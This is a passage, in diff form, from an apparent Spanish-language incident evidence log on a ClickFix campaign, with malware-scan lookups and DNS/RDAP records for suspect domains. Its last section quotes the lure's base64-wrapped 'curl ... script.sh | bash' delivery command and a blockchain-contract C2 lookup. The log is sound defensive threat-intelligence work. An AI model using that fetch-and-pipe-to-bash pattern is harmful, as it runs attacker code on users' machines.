Verification","submitted_at":"2026-10-01T09:17:22.625622","completed_at":"2026-10-01T09:18:04.654088"}]
+
+[2026-10-08 16:56:22 UTC] GET https://scanmalware.com/api/v1/domains/quicksecurity-checkpointv1.pages.dev/scans  HTTP 200  (SHA-256 3814b3137e8e90a6009bd673200030f19c9290364ce58b70ab1c81c12047e6c4)
+[{"scan_id":"505c315b-c3f6-4695-89f6-00ed611cd5af","url":"https://quicksecurity-checkpointv1.pages.dev/","final_url":"https://quicksecurity-checkpointv1.pages.dev/?vid=626d92a5f778&stamp=1790871955829&nonce=94285","matched_on":["url","final_url"],"status":"completed","scan_type":"public","title":"Secure Gateway • Quick Verification","submitted_at":"2026-10-01T16:25:53.119129","completed_at":"2026-10-01T16:26:35.180833"},{"scan_id":"39c8dc5b-12cf-4643-a111-20c474e67c3a","url":"https://quicksecurity-checkpointv1.pages.dev/","final_url":"https://quicksecurity-checkpointv1.pages.dev/?vid=5a11d6c22e34&stamp=1790848175557&nonce=27816","matched_on":["url","final_url"],"status":"completed","scan_type":"public","title":"Secure Gateway • Quick Verification","submitted_at":"2026-10-01T09:49:32.549773","completed_at":"2026-10-01T09:50:13.010843"},{"scan_id":"7644e7e5-9a7f-4f80-95b1-50948236f658","url":"https://quicksecurity-checkpointv1.pages.dev/","final_url":"https://quicksecurity-checkpointv1.pages.dev/?vid=3f69cbc50a4e&stamp=1790846653181&nonce=52264","matched_on":["url","final_url"],"status":"completed","scan_type":"public","title":"Secure Gateway • Quick Verification","submitted_at":"2026-10-01T09:24:10.213084","completed_at":"2026-10-01T09:24:54.359810"}]
+
+[2026-10-08 16:56:21 UTC] GET https://scanmalware.com/api/v1/domains/virelianmatrix.digital/scans  HTTP 200  (SHA-256 4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945)
+[]
+
+[2026-10-08 16:56:21 UTC] GET https://scanmalware.com/api/v1/domains/aetherframework.digital/scans  HTTP 200  (SHA-256 4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945)
+[]
+
+Lectura: ScanMalware no tiene ningun escaneo de los dos servidores de entrega,
+asi que no guarda el contenido de script.sh.
+--------------------------------------------------------------------------------
+[4] Otras fuentes consultadas sin resultado
+--------------------------------------------------------------------------------
+[2026-10-08 16:56:33 UTC] GET https://urlscan.io/api/v1/search/?q=domain:virelianmatrix.digital&size=100  HTTP 200  total=0 results=0
+[2026-10-08 16:56:35 UTC] GET https://urlscan.io/api/v1/search/?q=domain:aetherframework.digital&size=100  HTTP 200  total=0 results=0
+[2026-10-08 16:56:44 UTC] POST https://threatfox-api.abuse.ch/api/v1/ (search_ioc, ambos dominios)  HTTP 401 {"error": "Unauthorized"}
+[2026-10-08 16:56:44 UTC] POST https://urlhaus-api.abuse.ch/v1/host/ (ambos dominios)  HTTP 401 {"error": "Unauthorized"}
+Lectura: abuse.ch exige clave de API; sin ella no se pudo comprobar la etiqueta
+ClearFake que menciona ScanMalware.
+--------------------------------------------------------------------------------
+[5] DNS y RDAP de los 4 hosts
+--------------------------------------------------------------------------------
+[virelianmatrix[.]digital]
+[2026-10-08 16:59:09 UTC] GET https://cloudflare-dns.com/dns-query?name=virelianmatrix.digital&type=A
+{"Status":0,"TC":false,"RD":true,"RA":true,"AD":false,"CD":false,"Question":[{"name":"virelianmatrix.digital","type":1}],"Answer":[{"name":"virelianmatrix.digital","type":1,"TTL":300,"data":"104.21.38.36"},{"name":"virelianmatrix.digital","type":1,"TTL":300,"data":"172.67.218.80"}]}
+GET https://cloudflare-dns.com/dns-query?name=virelianmatrix.digital&type=NS
+{"Status":0,"TC":false,"RD":true,"RA":true,"AD":false,"CD":false,"Question":[{"name":"virelianmatrix.digital","type":2}],"Answer":[{"name":"virelianmatrix.digital","type":2,"TTL":86400,"data":"lady.ns.cloudflare.com."},{"name":"virelianmatrix.digital","type":2,"TTL":86400,"data":"malcolm.ns.cloudflare.com."}]}
+[2026-10-08 16:59:09 UTC] GET https://rdap.identitydigital.services/rdap/domain/virelianmatrix.digital  HTTP 200
+{
+  "rdapConformance": [
+    "rdap_level_0",
+    "icann_rdap_response_profile_1",
+    "icann_rdap_technical_implementation_guide_1",
+    "redacted"
+  ],
+  "notices": [
+    {
+      "title": "Terms of Service",
+      "description": [
+        "Access to RDAP information is provided to assist persons in determining the contents of a domain name registration record in the registry database. The data in this record is provided by Identity Digital or, if the record pertains to a TLD not operated by Identity Digital, then the corresponding primary Registry Operator for informational purposes only, and neither Identity Digital nor the Registry Operator guarantee its accuracy. This service is intended only for query-based access. You agree that you will use this data only for lawful purposes and that, under no circumstances will you use this data to (a) allow, enable, or otherwise support the transmission by e-mail, telephone, or facsimile of mass unsolicited, commercial advertising or solicitations to entities other than the data recipient's own existing customers; or (b) enable high volume, automated, electronic processes that send queries or data to the systems of Identity Digital, a Registrar, or Registry Operator except as reasonably necessary to register domain names or modify existing registrations. When using the RDAP service, please consider the following: the RDAP service is not a replacement for standard EPP commands to the SRS service. RDAP is not considered authoritative for registered domain objects. The RDAP service may be scheduled for downtime during production or OT&E maintenance periods. Queries to the RDAP services are throttled. If too many queries are received from a single IP address within a specified time, the service will begin to reject further queries for a period of time to prevent disruption of RDAP service access. Abuse of the RDAP system through data mining is mitigated by detecting and limiting bulk query access from single sources. Where applicable, the presence of a [Non-Public Data] tag indicates that such data is not made publicly available due to applicable data privacy laws or requirements. Should you wish to contact the registrant, please refer to the RDAP records available through the registrar URL listed above. Access to non-public data may be provided, upon request, where it can be reasonably confirmed that the requester holds a specific legitimate interest and a proper legal basis for accessing the withheld data. Access to the data provided by Identity Digital can be requested by submitting a request via the form found at https://www.identity.digital/about/policies/whois-layered-access/ Identity Digital Inc. and, if applicable, the primary Registry Operators reserve the right to modify these terms at any time. By submitting this query, you agree to abide by this policy."
+      ],
+      "links": [
+        {
+          "value": "https://rdap.identitydigital.services/rdap/domain/virelianmatrix.digital",
+          "rel": "terms-of-service",
+          "href": "https://www.identity.digital/policies/rdds-access-policy",
+          "type": "text/html"
+        }
+      ]
+    },
+    {
+      "title": "Status Codes",
+      "description": [
+        "For more information on domain status codes, please visit https://icann.org/epp"
+      ],
+      "links": [
+        {
+          "value": "https://rdap.identitydigital.services/rdap/domain/virelianmatrix.digital",
+          "rel": "glossary",
+          "href": "https://icann.org/epp",
+          "type": "application/rdap+json"
+        }
+      ]
+    },
+    {
+      "title": "RDDS Inaccuracy Complaint Form",
+      "description": [
+        "URL of the ICANN RDDS Inaccuracy Complaint Form: https://icann.org/wicf"
+      ],
+      "links": [
+        {
+          "value": "https://rdap.identitydigital.services/rdap/domain/virelianmatrix.digital",
+          "rel": "help",
+          "href": "https://icann.org/wicf",
+          "type": "application/rdap+json"
+        }
+      ]
+    }
+  ],
+  "ldhName": "virelianmatrix.digital",
+  "unicodeName": "virelianmatrix.digital",
+  "nameservers": [
+    {
+      "ldhName": "lady.ns.cloudflare.com",
+      "unicodeName": "lady.ns.cloudflare.com",
+      "objectClassName": "nameserver",
+      "handle": "33272b098161479ba124f8cd544ffa47-DONUTS",
+      "status": [
+        "associated"
+      ]
+    },
+    {
+      "ldhName": "malcolm.ns.cloudflare.com",
+      "unicodeName": "malcolm.ns.cloudflare.com",
+      "objectClassName": "nameserver",
+      "handle": "1ad17d9b68cf4314aa425a2aa3432aa8-DONUTS",
+      "status": [
+        "associated"
+      ]
+    }
+  ],
+  "secureDNS": {
+    "delegationSigned": false,
+    "maxSigLife": 1
+  },
+  "redacted": [
+    {
+      "name": {
+        "type": "Registry Domain ID"
+      },
+      "prePath": "$.handle",
+      "pathLang": "jsonpath",
+      "method": "removal"
+    }
+  ],
+  "objectClassName": "domain",
+  "status": [
+    "client transfer prohibited"
+  ],
+  "events": [
+    {
+      "eventAction": "expiration",
+      "eventDate": "2027-06-06T10:13:32.353Z"
+    },
+    {
+      "eventAction": "registration",
+      "eventDate": "2026-06-06T10:13:32.353Z"
+    },
+    {
+      "eventAction": "last changed",
+      "eventDate": "2026-08-13T19:06:15.878Z"
+    },
+    {
+      "eventAction": "last update of RDAP database",
+      "eventDate": "2026-10-08T16:59:10.805Z"
+    }
+  ],
+  "entities": [
+    {
+      "vcardArray": [
+        "vcard",
+        [
+          [
+            "version",
+            {},
+            "text",
+            "4.0"
+          ],
+          [
+            "fn",
+            {},
+            "text",
+            "PDR Ltd. d/b/a PublicDomainRegistry.com"
+          ]
+        ]
+      ],
+      "roles": [
+        "registrar"
+      ],
+      "publicIds": [
+        {
+          "type": "IANA Registrar ID",
+          "identifier": "303"
+        }
+      ],
+      "objectClassName": "entity",
+      "handle": "303",
+      "entities": [
+        {
+          "vcardArray": [
+            "vcard",
+            [
+              [
+                "version",
+                {},
+                "text",
+                "4.0"
+              ],
+              [
+                "fn",
+                {},
+                "text",
+                ""
+              ],
+              [
+                "tel",
+                {
+                  "type": "voice"
+                },
+                "uri",
+                "tel:+91.2230797500"
+              ],
+              [
+                "email",
+                {},
+                "text",
+                "abuse@publicdomainregistry.com"
+              ]
+            ]
+          ],
+          "roles": [
+            "abuse"
+          ],
+          "objectClassName": "entity"
+        }
+      ],
+      "links": [
+        {
+          "value": "https://rdap.identitydigital.services/rdap/entity/303",
+          "rel": "self",
+          "href": "https://rdap.identitydigital.services/rdap/entity/303",
+          "type": "application/rdap+json"
+        },
+        {
+          "value": "https://rdapserver.net/",
+          "rel": "about",
+          "href": "https://rdapserver.net/",
+          "type": "application/rdap+json"
+        }
+      ]
+    }
+  ],
+  "links": [
+    {
+      "value": "https://rdap.identitydigital.services/rdap/domain/virelianmatrix.digital",
+      "rel": "related",
+      "href": "https://rdapserver.net/domain/virelianmatrix.digital",
+      "type": "application/rdap+json"
+    },
+    {
+      "value": "https://rdap.identitydigital.services/rdap/domain/virelianmatrix.digital",
+      "rel": "self",
+      "href": "https://rdap.identitydigital.services/rdap/domain/virelianmatrix.digital",
+      "type": "application/rdap+json"
+    }
+  ]
+}
+
+[aetherframework[.]digital]
+[2026-10-08 16:59:10 UTC] GET https://cloudflare-dns.com/dns-query?name=aetherframework.digital&type=A
+{"Status":3,"TC":false,"RD":true,"RA":true,"AD":false,"CD":false,"Question":[{"name":"aetherframework.digital","type":1}],"Authority":[{"name":"digital","type":6,"TTL":3600,"data":"v0n0.nic.digital. hostmaster.donuts.email. 1791478111 7200 900 1209600 3600"}]}
+GET https://cloudflare-dns.com/dns-query?name=aetherframework.digital&type=NS
+{"Status":3,"TC":false,"RD":true,"RA":true,"AD":false,"CD":false,"Question":[{"name":"aetherframework.digital","type":2}],"Authority":[{"name":"digital","type":6,"TTL":3600,"data":"v0n0.nic.digital. hostmaster.donuts.email. 1791478111 7200 900 1209600 3600"}]}
+[2026-10-08 16:59:11 UTC] GET https://rdap.identitydigital.services/rdap/domain/aetherframework.digital  HTTP 200
+{
+  "rdapConformance": [
+    "rdap_level_0",
+    "icann_rdap_response_profile_1",
+    "icann_rdap_technical_implementation_guide_1",
+    "redacted"
+  ],
+  "notices": [
+    {
+      "title": "Terms of Service",
+      "description": [
+        "Access to RDAP information is provided to assist persons in determining the contents of a domain name registration record in the registry database. The data in this record is provided by Identity Digital or, if the record pertains to a TLD not operated by Identity Digital, then the corresponding primary Registry Operator for informational purposes only, and neither Identity Digital nor the Registry Operator guarantee its accuracy. This service is intended only for query-based access. You agree that you will use this data only for lawful purposes and that, under no circumstances will you use this data to (a) allow, enable, or otherwise support the transmission by e-mail, telephone, or facsimile of mass unsolicited, commercial advertising or solicitations to entities other than the data recipient's own existing customers; or (b) enable high volume, automated, electronic processes that send queries or data to the systems of Identity Digital, a Registrar, or Registry Operator except as reasonably necessary to register domain names or modify existing registrations. When using the RDAP service, please consider the following: the RDAP service is not a replacement for standard EPP commands to the SRS service. RDAP is not considered authoritative for registered domain objects. The RDAP service may be scheduled for downtime during production or OT&E maintenance periods. Queries to the RDAP services are throttled. If too many queries are received from a single IP address within a specified time, the service will begin to reject further queries for a period of time to prevent disruption of RDAP service access. Abuse of the RDAP system through data mining is mitigated by detecting and limiting bulk query access from single sources. Where applicable, the presence of a [Non-Public Data] tag indicates that such data is not made publicly available due to applicable data privacy laws or requirements. Should you wish to contact the registrant, please refer to the RDAP records available through the registrar URL listed above. Access to non-public data may be provided, upon request, where it can be reasonably confirmed that the requester holds a specific legitimate interest and a proper legal basis for accessing the withheld data. Access to the data provided by Identity Digital can be requested by submitting a request via the form found at https://www.identity.digital/about/policies/whois-layered-access/ Identity Digital Inc. and, if applicable, the primary Registry Operators reserve the right to modify these terms at any time. By submitting this query, you agree to abide by this policy."
+      ],
+      "links": [
+        {
+          "value": "https://rdap.identitydigital.services/rdap/domain/aetherframework.digital",
+          "rel": "terms-of-service",
+          "href": "https://www.identity.digital/policies/rdds-access-policy",
+          "type": "text/html"
+        }
+      ]
+    },
+    {
+      "title": "Status Codes",
+      "description": [
+        "For more information on domain status codes, please visit https://icann.org/epp"
+      ],
+      "links": [
+        {
+          "value": "https://rdap.identitydigital.services/rdap/domain/aetherframework.digital",
+          "rel": "glossary",
+          "href": "https://icann.org/epp",
+          "type": "application/rdap+json"
+        }
+      ]
+    },
+    {
+      "title": "RDDS Inaccuracy Complaint Form",
+      "description": [
+        "URL of the ICANN RDDS Inaccuracy Complaint Form: https://icann.org/wicf"
+      ],
+      "links": [
+        {
+          "value": "https://rdap.identitydigital.services/rdap/domain/aetherframework.digital",
+          "rel": "help",
+          "href": "https://icann.org/wicf",
+          "type": "application/rdap+json"
+        }
+      ]
+    }
+  ],
+  "ldhName": "aetherframework.digital",
+  "unicodeName": "aetherframework.digital",
+  "nameservers": [
+    {
+      "ldhName": "ns1.suspended-domain.com",
+      "unicodeName": "ns1.suspended-domain.com",
+      "objectClassName": "nameserver",
+      "handle": "eed7998294bb45c28650cc6efb674598-DONUTS",
+      "status": [
+        "associated"
+      ]
+    },
+    {
+      "ldhName": "ns2.suspended-domain.com",
+      "unicodeName": "ns2.suspended-domain.com",
+      "objectClassName": "nameserver",
+      "handle": "63987c70f6264135be58631595a6ba95-DONUTS",
+      "status": [
+        "associated"
+      ]
+    }
+  ],
+  "secureDNS": {
+    "delegationSigned": false,
+    "maxSigLife": 1
+  },
+  "redacted": [
+    {
+      "name": {
+        "type": "Registry Domain ID"
+      },
+      "prePath": "$.handle",
+      "pathLang": "jsonpath",
+      "method": "removal"
+    }
+  ],
+  "objectClassName": "domain",
+  "status": [
+    "client delete prohibited",
+    "client hold",
+    "client renew prohibited",
+    "client transfer prohibited",
+    "client update prohibited"
+  ],
+  "events": [
+    {
+      "eventAction": "expiration",
+      "eventDate": "2027-06-06T10:13:32.108Z"
+    },
+    {
+      "eventAction": "registration",
+      "eventDate": "2026-06-06T10:13:32.108Z"
+    },
+    {
+      "eventAction": "last changed",
+      "eventDate": "2026-08-12T09:42:57.765Z"
+    },
+    {
+      "eventAction": "last update of RDAP database",
+      "eventDate": "2026-10-08T16:59:11.911Z"
+    }
+  ],
+  "entities": [
+    {
+      "vcardArray": [
+        "vcard",
+        [
+          [
+            "version",
+            {},
+            "text",
+            "4.0"
+          ],
+          [
+            "fn",
+            {},
+            "text",
+            "PDR Ltd. d/b/a PublicDomainRegistry.com"
+          ]
+        ]
+      ],
+      "roles": [
+        "registrar"
+      ],
+      "publicIds": [
+        {
+          "type": "IANA Registrar ID",
+          "identifier": "303"
+        }
+      ],
+      "objectClassName": "entity",
+      "handle": "303",
+      "entities": [
+        {
+          "vcardArray": [
+            "vcard",
+            [
+              [
+                "version",
+                {},
+                "text",
+                "4.0"
+              ],
+              [
+                "fn",
+                {},
+                "text",
+                ""
+              ],
+              [
+                "tel",
+                {
+                  "type": "voice"
+                },
+                "uri",
+                "tel:+91.2230797500"
+              ],
+              [
+                "email",
+                {},
+                "text",
+                "abuse@publicdomainregistry.com"
+              ]
+            ]
+          ],
+          "roles": [
+            "abuse"
+          ],
+          "objectClassName": "entity"
+        }
+      ],
+      "links": [
+        {
+          "value": "https://rdap.identitydigital.services/rdap/entity/303",
+          "rel": "self",
+          "href": "https://rdap.identitydigital.services/rdap/entity/303",
+          "type": "application/rdap+json"
+        },
+        {
+          "value": "https://rdapserver.net/",
+          "rel": "about",
+          "href": "https://rdapserver.net/",
+          "type": "application/rdap+json"
+        }
+      ]
+    }
+  ],
+  "links": [
+    {
+      "value": "https://rdap.identitydigital.services/rdap/domain/aetherframework.digital",
+      "rel": "related",
+      "href": "https://rdapserver.net/domain/aetherframework.digital",
+      "type": "application/rdap+json"
+    },
+    {
+      "value": "https://rdap.identitydigital.services/rdap/domain/aetherframework.digital",
+      "rel": "self",
+      "href": "https://rdap.identitydigital.services/rdap/domain/aetherframework.digital",
+      "type": "application/rdap+json"
+    }
+  ]
+}
+
+[securecheckv1-proceed[.]pages[.]dev]
+[2026-10-08 16:59:11 UTC] GET https://cloudflare-dns.com/dns-query?name=securecheckv1-proceed.pages.dev&type=A
+{"Status":0,"TC":false,"RD":true,"RA":true,"AD":false,"CD":false,"Question":[{"name":"securecheckv1-proceed.pages.dev","type":1}],"Answer":[{"name":"securecheckv1-proceed.pages.dev","type":1,"TTL":300,"data":"172.66.44.58"},{"name":"securecheckv1-proceed.pages.dev","type":1,"TTL":300,"data":"172.66.47.198"}]}
+GET https://cloudflare-dns.com/dns-query?name=securecheckv1-proceed.pages.dev&type=NS
+{"Status":0,"TC":false,"RD":true,"RA":true,"AD":false,"CD":false,"Question":[{"name":"securecheckv1-proceed.pages.dev","type":2}],"Answer":[{"name":"securecheckv1-proceed.pages.dev","type":2,"TTL":86400,"data":"drew.ns.cloudflare.com."},{"name":"securecheckv1-proceed.pages.dev","type":2,"TTL":86400,"data":"fiona.ns.cloudflare.com."}]}
+RDAP: no aplica (subdominio de pages.dev, que es de Cloudflare). Que resuelva no
+dice si la pagina sigue publicada: no se visito.
+
+[quicksecurity-checkpointv1[.]pages[.]dev]
+[2026-10-08 16:59:12 UTC] GET https://cloudflare-dns.com/dns-query?name=quicksecurity-checkpointv1.pages.dev&type=A
+{"Status":0,"TC":false,"RD":true,"RA":true,"AD":false,"CD":false,"Question":[{"name":"quicksecurity-checkpointv1.pages.dev","type":1}],"Answer":[{"name":"quicksecurity-checkpointv1.pages.dev","type":1,"TTL":300,"data":"172.66.45.46"},{"name":"quicksecurity-checkpointv1.pages.dev","type":1,"TTL":300,"data":"172.66.46.210"}]}
+GET https://cloudflare-dns.com/dns-query?name=quicksecurity-checkpointv1.pages.dev&type=NS
+{"Status":0,"TC":false,"RD":true,"RA":true,"AD":false,"CD":false,"Question":[{"name":"quicksecurity-checkpointv1.pages.dev","type":2}],"Answer":[{"name":"quicksecurity-checkpointv1.pages.dev","type":2,"TTL":86400,"data":"colette.ns.cloudflare.com."},{"name":"quicksecurity-checkpointv1.pages.dev","type":2,"TTL":86400,"data":"west.ns.cloudflare.com."}]}
+RDAP: no aplica (subdominio de pages.dev, que es de Cloudflare). Que resuelva no
+dice si la pagina sigue publicada: no se visito.
+
+--------------------------------------------------------------------------------
+[6] Have I Been Squatted: mismo patron de entrega y este contrato (julio de 2026)
+--------------------------------------------------------------------------------
+[2026-10-08 16:55:56 UTC] GET https://haveibeensquatted.com/blog/from-typosquatting-to-macos-backdoor-clickfix-blockchain-c2  HTTP 200
+  cuerpo HTML: 524015 bytes, SHA-256 65510abfc727c48fb65702e392972e7b2e2d176afb4168b6c84b8f2fc86cbd9e
+  Autor y fecha: Ben Folland, 2026-07-06. Captura 07 (2026-10-08 17:02 UTC).
+  Datos que trae el articulo y que se cruzan con este caso:
+    - Pagina ClickFix en Cloudflare Pages que copia bash <<< $(echo "<base64>" | base64 -d),
+      decodificado a curl -s 'hxxps://<servidor>/script.sh' | bash. Mismo formato que
+      el de la seccion 2, pero otra pagina (delicatelyu[.]pages[.]dev) y otro
+      servidor del script (pied9pcl[.]parsgol[.]casino).
+    - El script llama a eth_call con to=0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0 y
+      data=0x2686ecea, a los mismos 4 nodos RPC que la captura de fab0.
+    - Dice que un analisis previo decodifico sj98xe4[.]xyz y que una relectura del
+      2026-07-04 devolvio apdhlhs3[.]xyz.
+  Cruce con evidencia_historial_contrato_28092026.txt: sj98xe4[.]xyz se escribio el
+  2026-06-02 y el 2026-06-22; apdhlhs3[.]xyz quedo vigente desde el 2026-06-30 18:23:44
+  (tx 0x59cb424dfb6f1086a55ba3a7ff8bfa0aaa3474901ab954c032011ae8955fc7d6) hasta el
+  2026-07-09 17:03:35. El 04-07 el contrato devolvia apdhlhs3[.]xyz: coincide.
+  El articulo no nombra a Phexia, no menciona las paginas ni los servidores de la
+  seccion 2, y su infraestructura de julio no se incorpora a los IOCs de este caso.
+  El cruce prueba que la cadena de julio leia este contrato; no prueba nada sobre
+  los hosts de octubre.
+
+Archivos de esta evidencia: 06_evidencia_scanmalware_hunt_08102026.png y
+07_evidencia_hibs_contrato_08102026.png. Sumas en evidencia.sha256.
